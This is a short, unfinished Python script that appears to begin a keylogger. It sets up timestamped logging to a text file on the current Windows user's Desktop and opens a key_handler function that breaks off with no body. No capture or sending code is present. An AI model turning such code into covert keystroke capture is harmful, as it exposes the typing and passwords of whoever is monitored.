import os 
import logging


username = os.getlogin()
loggin_directory = f"C:/Users/{username}/Desktop"

logging.basicConfig(filename=f"{loggin_directory}/mylog.txt, ", level=logging.DEBUG,format="%(asctime)s: %(message)s")


def key_handler(key):
    